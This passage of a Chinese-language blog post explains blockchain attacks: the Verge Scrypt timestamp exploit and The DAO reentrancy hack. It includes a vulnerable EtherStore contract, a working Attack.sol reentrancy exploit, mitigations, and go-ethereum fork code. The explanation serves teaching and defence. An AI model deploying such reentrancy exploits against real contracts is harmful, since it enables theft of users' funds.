<p>Verge做出这个决定的出发点也是非常好的。因为，随着时间推移，比特币矿场变得过于专业化和中心化，例如，比特币大部分区块都是由 Bitcoin ASIC 矿机（这种矿机专门设计用于挖比特币）产生，并且许多比特币是由少数矿池挖出来的。Verge开发者认为，如果使用5中不同的算法，任何人想要同时控制5种算法， 使用5中专用硬件，难度应该会高于只用一种算法，从而促进 Verge 挖矿经济朝着更分布式、去中心化的方向发展。</p>
<p>这样，保证系统正常运行的方法是，每个算法都有<em>自己</em>的挖矿难度参数，并且独立于其余四个算法进行调整，这意味着，Scrypt 的挖矿难度将调整到每30秒产生一个区块，X17 及其他三种算法亦然。从而整个 Verge 网络才能保证每 30 秒产生一个区块、保持全部五种算法的收益对于矿工来说都是均衡的，并确保没有一种算法占优势地位。</p>
<p>这意味着伪造的时间戳并没有降低整个网络挖矿难度，而仅仅只是降低了五个算法中的 Scrypt的挖矿难度。因此，当 Scrypt 矿工的挖矿难度很低时，其他四种算法的矿工依旧得像之前一样努力工作，那么它们的哈希算力对于维护网络安全就没用了。更重要的是，攻击者仅需要使用 Scrypt 算法挖矿，并且仅需要与也使用 Srypt 挖矿的人竞争。因此，攻击者控制网络所需的哈希算力从当初的超过50%（在整个网络中占多数），下降到仅需超过10%（在 Scrypt 矿工中占多数），而Reddit 论坛上有人粗略地估计，这个数字甚至<a href="https://link.zhihu.com/?target=https://www.reddit.com/r/CryptoCurrency/comments/8a2b99/verge_xvg_mining_exploit_attack_megathread/">低至0.4%</a>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233088.jpg" alt="img">使用scrypt算法产生的区块</p>
<p>在攻击产生后，Verge的股价产生了波动。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233089.jpg" alt="img">攻击发生后，股价下跌</p>
<p>下图是5月的第二次攻击后产生的；据说第一次攻击后一周，反而上涨了…..</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233090.jpg" alt="img">一个月之间，跌了20%</p>
<p>应该来说，从中应该得到的教训是：当涉及用户金融资产时，应更倾向于事实证明更行之有效的方法，并防止事情变得过于复杂，从而带来不必要的风险。</p>
<h2 id="THE-DAO攻击"><a href="#THE-DAO攻击" class="headerlink" title="THE DAO攻击"></a>THE DAO攻击</h2><p>在区块链技术领域，The DAO攻击中，面对黑客当着面利用漏洞源源不断从1.5亿美金的以太币池中拿走资金，而且还没办法。</p>
<p>The DAO项目是区块链物联网公司Slock.it发起的一个众筹项目。THE DAO是一个分散自治的组织(Decentralized Autonomous Organization),它的目标是编写一个组织的规则和决策机构，消除对文件和人员治理的需求，建立一个分散控制的结构。DAO是区块链法则里不可少的一环，而the DAO含义为“DAO之母”，是建立在以太坊上的一个应用，功能类似于投资机构。参与者可以使用以太币来换取DAO，也就是the DAO的token，持有DAO可以对the DAO的投资决策提出自己的意见。</p>
<p>它的工作流程如下：</p>
<ol>
<li>技术人员编写在组织上运行的智能合约</li>
<li>在初始资金募集期，通过购买代表所有权的token代币来将资金注入到DAO项目中，也即ICO，为项目提供资金（THE DAO众筹约1.5亿美元的资金，是当时最大的众筹项目；远超创建者预期）</li>
<li>ICO之后，DAO开始运作</li>
<li>创业者可以给DAO项目提出议案，拥有TOKEN的成员享有投票权，通过投票决定是否通过议案</li>
</ol>
<p>项目运作特点： </p>
<ol>
<li>通过智能合约来主导以太币资金的分发利用</li>
<li>参与众筹人按照出资金额（比特币等），获得相应DAO代币，即内部token，具有审查及投票表决权利</li>
<li>投资议案由全体代币持有人投票，每个代币一票</li>
<li>项目收益按照一定规则回馈代币持有人</li>
</ol>
<p>The DAO项目于2016年4月30日开始，融资窗口开放了28天。不知出于什么原因，反正The DAO项目就这么火起来了，截止5月15日这个项目筹得了超过一亿美元，而到整个融资期结束，共有超过11,000位热情的成员参与进来，筹得1.5亿美元，成为历史上最大的众筹项目。The DAO所集资的钱远远超过其创建者的预期。</p>
<p>可以说，他们的市场战略比他们职能的执行来的好，因为在众销期间，就有人担心其代码会很容易受到攻击。6月17日发生了黑客攻击事件，事件的根本原因在于一行早已被发现的代码漏洞。 康奈尔大学计算机科学系副教授Emin Gün Sirer在给他的一位学生发邮件时提到他正在研究智能合约第666行代码可能存在的问题，甚至在2016年5月份也呼吁过投资者停止对DAO的投资，因为存在这样的安全漏洞。但是，Gün教授对于代码漏洞无能为力，因为代码发布在以太坊区块链上就无法修改。事实上，发现这行代码漏洞的并不止Gün教授，2016年6月9日，在互联网上出现了与这次黑客攻击相同手法的预警，6月10日智能合约语言Solidity的作者 Christian在以太坊官方博客上发表文章说明这个问题，the DAO团队也接到了安全报告，但做出了不会受到攻击的结论。有一点需要重申，那就是以太坊网络之前没有出现过这种漏洞，并且整个期间一直运作良好。其实所有网络系统都有可能会遭到各种各样的攻击。而支撑价值超过10亿美元（根据市值计算）的以太币的以太坊网络还没有遇到过黑客攻击，而且它同时还在运行很多其他智能合约。6月18日，也就是周六，黑客成功挖到超过360万个以太币，并投入到一个DAO子组织中，这个组织和THE DAO有着同样的结构。当时以太币价格从20多美元直接跌破13美元。</p>
<p>The DAO的智能合约中有一个splitDAO函数，splitDAO的本意是要保护投票中处于弱势地位的少数派防止他们被多数派通过投票的方式合法剥削。通过分裂出一个小规模的DAO，给予他们一个用脚投票的机制，同时仍然确保他们可以获取分裂前进行的对外资助产生的可能收益。</p>
<p>攻击者通过此函数中的漏洞重复利用自己的DAO资产来不断从TheDAO项目的资产池中分离DAO资产给自己。</p>
<p>在DAO.sol中，function splitDAO函数有这样一行：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233091.jpg" alt="img"></p>
<p>然后，withdrawRewardFor的实现如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233092.jpg" alt="img"></p>
<p>再看payOut函数调用。rewardAccount的类型是ManagedAccount，在ManagedAccount.sol中可以看到：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233093.jpg" alt="img"></p>
<p>关于以上代码为何会导致攻击，我们来分析一下。</p>
<p>既然以太币是作为电子货币，那么自然会有交易，也即send()和receive()。以太坊上的编程语言solidity提供了三种方法实现send功能。分别是address.send，address.transfer和address.call.value。</p>
<p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.value()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p>
<p><strong><address>.transfer()</strong></p>
<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.send()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<p><strong><address>.gas().call.value()()</strong></p>
<ul>
<li>当发送失败时会返回 <code>false</code> 布尔值</li>
<li>传递所有可用 Gas 进行调用（可通过 <code>gas(gas_value)</code> 进行限制），不能有效防止重入（reentrancy）</li>
</ul>
<p>如何理解防止重入呢？基本来说，攻击者要想实现攻击，需要让受害者执行自己的代码。而因为send和transfer都只能使用2300的gas，也即当执行完一小段代码之后，要么成功返回，要么gas耗尽，从而让攻击者所能做的操作相当有限。call.value不存在这个限制。接下来就是要将正常的操作流程导向攻击者的代码。</p>
<p>solidity还提供了一个特性：</p>
<h3 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 - fallback()"></a>回退函数 - fallback()</h3><p>官方文档：</p>
<blockquote>
<p><strong>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</strong></p>
</blockquote>
<p>一个合约可以具有一个匿名函数，该函数没有参数也没有返回值。当该合约被调用时找不到匹配的函数名，或者说被调用时没有提供参数，那么就调用fallback 函数。</p>
<blockquote>
<p>pragma solidity ^0.4.0;</p>
<p>contract SimpleFallback{<br><strong>function</strong>(){<br><em>&#x2F;&#x2F;fallback function</em><br>}<br>}</p>
</blockquote>
<p>另外，当使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数。在这种情况下，一定要定义fallback函数，并且fallback函数还必须使用Payable修饰，否则send会报错。正是因为如此，所以对send函数做了一定的限制，gas只能使用2300。这样，下述行为消耗的gas都将超过fallback函数限定的gas值：</p>
<ul>
<li>向区块链中写数据</li>
<li>创建一个合约</li>
<li>调用一个external的函数</li>
<li>发送ether</li>
</ul>
<p>所以一般，我们只能在fallback函数中进行一些日志操作：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract FallbackFailOnGasLimit&#123;</span><br><span class="line">  uint someStorage;</span><br><span class="line"></span><br><span class="line">  event fallbackTrigged(bytes);</span><br><span class="line">  function() payable&#123;</span><br><span class="line">    fallbackTrigged(msg.data);</span><br><span class="line">    //将因为写入操作失败，注释掉下面这行，将会执行成功</span><br><span class="line">    someStorage = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function callFallback() returns (bool)&#123;</span><br><span class="line">    return this.send(0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是对call.value没有2300 gas的限制。如果在调用过程中没有设置gas的值，那么会一直运行直到耗尽所有的gas。也即，如果想要执行恶意代码，多准备点gas就好。</p>
<p>接下来，我们看一个例子。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">EtherStore.sol：</span><br><span class="line"></span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123; </span><br><span class="line">       require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        // limit the withdrawal </span><br><span class="line">       require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        // limit the time allowed to withdraw</span><br><span class="line">        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks); </span><br><span class="line">       require(msg.sender.call.value(_weiToWithdraw)()); </span><br><span class="line">       balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>以上代码就是被攻击代码。它的功能是充当公共账户，类似于银行，接收用户存款（depositFund），提供用户取现功能（withdrawFunds）。</p>
<p>depositFund中，简单增加用户账户的余额，在用户取现的时候，首先做检查，确保用户账户的余额超出所要提取的金额，然后检查取现金额的最大值；接下来再对取现的时间进行限制，确保一周支取一次。然后将钱转给调用者账户，随后修改调用者msg.send的余额，并更新最新的取现时间。</p>
<p>这段合约的漏洞就在于：require(msg.sender.call.value(_weiToWithdraw)());</p>
<p>当被攻击代码执行到这一句的时候，它会调用msg.send代码中的fallback函数。如果是正常的fallback函数，譬如写日志，那没有任何问题；但是如果是攻击者精心准备的恶意代码，会有各种效果。</p>
<p>譬如，下面一段攻击代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Attack.sol：</span><br><span class="line"></span><br><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"> EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">  // intialise the etherStore variable with the contract address</span><br><span class="line"> constructor(address _etherStoreAddress) &#123;</span><br><span class="line">     etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      // attack to the nearest ether</span><br><span class="line">     require(msg.value &gt;= 1 ether); </span><br><span class="line">     // send eth to the depositFunds() function</span><br><span class="line">     etherStore.depositFunds.value(1 ether)();</span><br><span class="line">      // start the magic</span><br><span class="line">     etherStore.withdrawFunds(1 ether);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function collectEther() public &#123;</span><br><span class="line">     msg.sender.transfer(this.balance);</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"> // fallback function - where the magic happens</span><br><span class="line"> function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">         etherStore.withdrawFunds(1 ether);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击者首先准备好 etherStore变量，并将作为被攻击代码的地址作为参数传入。</p>
<p>etherStore &#x3D; EtherStore(_etherStoreAddress);</p>
<p>攻击者准备好pwnEtherStore()，这个函数首先向被攻击合约中存入一定以太币，假设是1以太币（因为EtherStore.sol要求取现是账户里有一定余额）。</p>
<p>etherStore.depositFunds.value(1 ether)()</p>
<p>然后进行取现，调用 etherStore.withdrawFunds(1 ether);</p>
<p>因为withdraw函数中使用了call.value()，根据solidity的规范，fallback函数将在Attack合约收到Ether（不带data）时自动执行。此fallback函数将通过递归触发对THE DAO的splitDAO函数的多次调用所以会调用攻击者合约中的匿名函数，而在攻击者的匿名函数中，又再次调用</p>
<p>etherStore.withdrawFunds(1 ether)。</p>
<p>因为受害者的代码中withdrawFunds在call.value之后才修改攻击者的余额，而call.value触发fallback，再次执行withdraw，所以相当于攻击者的余额一直没有机会被修改。这样，只要攻击者的gas足够多，它会一直将公共账户也即Bank里的钱全部移走。</p>
<p>因为攻击者的代码使得受害者合约一遍遍地重新执行攻击代码，所以也叫“重入”攻击。</p>
<p><strong>防御措施：</strong></p>
<p>从代码看，本次攻击得以成功的因素有二：一是dao余额扣减和Ether转账这两步操作的顺序有误，二是不受限制地执行未知代码。</p>
<p>应用代码顺序方面，应先扣减dao的余额再转账Ether，因为dao的余额检查作为转账Ether的先决条件，要求dao的余额状况必须能够及时反映最新状况。在问题代码实现中，尽管最深的递归返回并成功扣减黑客的dao余额，但此时对黑客dao余额的扣减已经无济于事，因为其上各层递归调用中余额检查都已成功告终，已经不会再有机会判断最新余额了。</p>
<p>不受限制地执行未知代码方面，虽然黑客当前是利用了solidity提供的匿名fallback函数，但这种对未知代码的执行原则上可以发生在更多场景下，因为合约之间的消息传递完全类似于面向对象程序开发中的方法调用，而提供接口等待回调是设计模式中常见的手法，所以完全有可能执行一个未知的普通函数。</p>
<p>本次漏洞属于应用层面，并不是以太坊本身的问题，甚至都不能归咎于“图灵完备”，因为这种攻击即使在一个非图灵完备的平台上也可以奏效。总的来说，应用越复杂，应用出现安全问题的概率就越高。</p>
<p>有许多常用技术可以帮助避免智能合约中潜在的重入漏洞：</p>
<ol>
<li>在将 Ether 发送给外部合约时使用内置的 transfer() 函数 。transfer转账功能只发送 2300 gas 不足以使目的地址&#x2F;合约调用另一份合约（即重入发送合约）。</li>
<li>确保所有改变状态变量的逻辑发生在 Ether 被发送出合约（或任何外部调用）之前。在这个 EtherStore 例子中，EtherStore.sol 中对账户余额和账户时间的修改应该在发送以太币之前。将任何对未知地址执行外部调用的代码，放置在本地化函数或代码执行中作为最后一个操作，是一种很好的做法。这被称为 <a href="https://link.zhihu.com/?target=http://solidity.readthedocs.io/en/latest/security-considerations.html%23use-the-checks-effects-interactions-pattern">检查效果交互（checks-effects-interactions）</a> 模式。</li>
<li>引入互斥锁。也就是说，要添加一个在代码执行过程中锁定合约的状态变量，阻止重入调用；这样在本次发送–修改余额这一整套操作完成之前，不能再次执行发送操作。</li>
</ol>
<p>譬如修改代码如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">// initialise the mutex</span><br><span class="line">bool reEntrancyMutex = false;</span><br><span class="line">uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">function depositFunds() public payable &#123;</span><br><span class="line">    balances[msg.sender] += msg.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(!reEntrancyMutex);</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    // limit the withdrawal</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    // limit the time allowed to withdraw</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    lastWithdrawTime[msg.sender] = now; </span><br><span class="line">   // set the reEntrancy mutex before the external call</span><br><span class="line">    reEntrancyMutex = true; </span><br><span class="line">   msg.sender.transfer(_weiToWithdraw);</span><br><span class="line">    // release the mutex after the external call </span><br><span class="line">   reEntrancyMutex = false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用reEntrancyMutex可以保证代码不可重入。类似于多线程的互斥锁。</p>
<p>THE DAO攻击后续：</p>
<p>THE DAO 创始人之一 Stephan TualTual 在 6 月 12 日宣布，他们发现了软件中存在的 “递归调用漏洞” 问题。 不幸的是，在程序员修复这一漏洞及其他问题的期间，一个不知名的黑客开始利用这一途径收集 THE DAO 代币销售中所得的以太币。6 月 18 日，黑客成功挖到超过 360 万个以太币，并投入到一个 DAO 子组织中，这个组织和 THE DAO 有着同样的结构。因为THE DAO 持有近 15% 的以太币总数，因此 THE DAO 这次的问题对以太坊网络及其加密币都产生了负面影响。</p>
<p>6 月 17 日，以太坊基金会的 Vitalik Buterin在以太坊官方博客发布题为［紧急状态更新：关于the DAO的漏洞］的文章，他表示，DAO 正在遭到攻击，不过他已经研究出了解决方案：</p>
<blockquote>
<p>现在提出了软件分叉解决方案，通过这种软件分叉，任何调用代码或委托调用的交易 —— 借助代码 hash0x7278d050619a624f84f51987149ddb439cdaadfba5966f7cfaea7ad44340a4ba（也就是 DAO 和子 DAO）来减少账户余额 —— 都会视为无效……</p>
</blockquote>
<p>最终因为社交的不同意见，最终以太坊分裂出支持继续维持原状的以太经典 ETC，同意软件分叉解决方案的在以太坊当前网络实施。</p>
<p>【疑似】攻击者通过一个中介表示，他会暂停这个有组织的对他财产的“盗窃”，他会奖励不支持这项软分叉提议的矿工（节点），他说：</p>
<blockquote>
<p>“很快我们就会有一个智能合约来奖励矿工，奖励那些反对软分叉并进行挖矿的人。共计100万个以太币，以及100个比特币会分享给矿工。”</p>
</blockquote>
<p>V神的解决方案实际上就是产生分叉，让黑客的操作无效。软分叉将从块高度1760000开始把任何与the DAO和child DAO相关的交易认做无效交易，以此阻止攻击者在27天之后提现被盗 的以太币。这之后会有一次硬分叉将以太币找回。</p>
<p>以下内容来自于参考文献11：</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h3><p>因为投资者已经将以太币投入了 The DAO 合约或者其子合约中，在攻击后无法立刻撤回。<br>需要让投资者快速撤回投资，且能封锁黑客转移资产。</p>
<p>V 神公布的解决方案是，在程序中植入转移合约以太币代码，让矿工选择是否支持分叉。在分叉点到达时则将 The DAO 和其子合约中的以太币转移到一个新的安全的可取款合约中。全部转移后，原投资者则可以直接从取款合约中快速的拿回以太币。取款合约在讨论方案时，已经部署到主网。合约地址是 <a href="https://link.zhihu.com/?target=https://%5Betherscan%5D(https//learnblockchain.cn/docs/etherscan/">0xbf4ed7b27f1d666546e30d74d50d173d20bca754</a>.io&#x2F;address&#x2F;0xbf4ed7b27f1d666546e30d74d50d173d20bca754)。</p>
<p>取款合约代码如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// Deployed on mainnet at 0xbf4ed7b27f1d666546e30d74d50d173d20bca754</span><br><span class="line"></span><br><span class="line">contract DAO &#123;</span><br><span class="line">    function balanceOf(address addr) returns (uint);</span><br><span class="line">    function transferFrom(address from, address to, uint balance) returns (bool);</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WithdrawDAO &#123;</span><br><span class="line">    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);</span><br><span class="line">    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;</span><br><span class="line"></span><br><span class="line">    function withdraw()&#123;</span><br><span class="line">        uint balance = mainDAO.balanceOf(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))</span><br><span class="line">            throw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trusteeWithdraw() &#123;</span><br><span class="line">        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，为照顾两个阵营，软件提供硬分叉开关，选择权则交给社区。支持分叉的矿工会在 X 区块到 X+9 区块出块时，在区块 <code>extradata</code> 字段中写入 <code>0x64616f2d686172642d666f726b</code>（“dao-hard-fork” 的十六进制数）。从分叉点开始，如果连续 10 个区块均有硬分叉投票，则表示硬分叉成功。</p>
<h3 id="矿工投票与区块头校验"><a href="#矿工投票与区块头校验" class="headerlink" title="矿工投票与区块头校验"></a><strong>矿工投票与区块头校验</strong></h3><p>首先，选择权交给社区。因此是否同意硬分叉，可通过参数进行选择。但是在当前版本中，社区已完成硬分叉，所以已移除开关类代码。</p>
<p>当前，主网已默认配置支持 DAO 分叉，并设定了开始硬分叉高度 1920000，代码如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// params/config.go:38</span><br><span class="line">MainnetChainConfig = &amp;ChainConfig&#123; </span><br><span class="line">		DAOForkBlock:        big.NewInt(1920000),</span><br><span class="line">		DAOForkSupport:      true, </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>如果矿工支持分叉，则需要在从高度 192000 到 192009，在区块头 <code>extradata</code> 写入指定信息 0x64616f2d686172642d666f726b ，以表示支持硬分叉。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//params/dao.go:28</span><br><span class="line">var DAOForkBlockExtra = common.FromHex(&quot;0x64616f2d686172642d666f726b&quot;)</span><br><span class="line"></span><br><span class="line">// params/dao.go:32</span><br><span class="line">var DAOForkExtraRange = big.NewInt(10)</span><br></pre></td></tr></table></figure>

<p>支持硬分叉时矿工写入固定的投票信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// miner/worker.go:857</span><br><span class="line">if daoBlock := w.config.DAOForkBlock; daoBlock != nil &#123; </span><br><span class="line">    // 检查是否区块是否仍然属于分叉处理期间：[DAOForkBlock,DAOForkBlock+10)</span><br><span class="line">    limit := new(big.Int).Add(daoBlock, params.DAOForkExtraRange)</span><br><span class="line">    if header.Number.Cmp(daoBlock) &gt;= 0 &amp;&amp; header.Number.Cmp(limit) &lt; 0 &#123;</span><br><span class="line">        // 如果支持分叉，则覆盖Extra，写入保留的投票信息</span><br><span class="line">        if w.config.DAOForkSupport &#123;</span><br><span class="line">        header.Extra = common.CopyBytes(params.DAOForkBlockExtra)</span><br><span class="line">        &#125; else if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;</span><br><span class="line">            // 如果矿工反对，则不能让其使用保留信息，覆盖它。</span><br><span class="line">        header.Extra = []byte&#123;&#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要连续 10 个区块的原因是为了防止矿工使用保留信息污染非分叉块和方便轻节点安全同步数据。<br>同时，所有节点在校验区块头时，必须安全地校验特殊字段信息，校验区块是否属于正确的分叉上。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// consensus/ethash/consensus.go:294 </span><br><span class="line">if err := misc.VerifyDAOHeaderExtraData(chain.Config(), header); err != nil &#123; //❶</span><br><span class="line">	return err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// consensus/misc/dao.go:47 </span><br><span class="line">func VerifyDAOHeaderExtraData(config *params.ChainConfig, header *types.Header) error &#123; </span><br><span class="line">	if config.DAOForkBlock == nil &#123;//❷</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	limit := new(big.Int).Add(config.DAOForkBlock, params.DAOForkExtraRange) //❸</span><br><span class="line">	if header.Number.Cmp(config.DAOForkBlock) &lt; 0 || header.Number.Cmp(limit) &gt;= 0 &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	if config.DAOForkSupport &#123;</span><br><span class="line">		if !bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; //❹</span><br><span class="line">			return ErrBadProDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;//❺</span><br><span class="line">			return ErrBadNoDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	// All ok, header has the same extra-data we expect</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
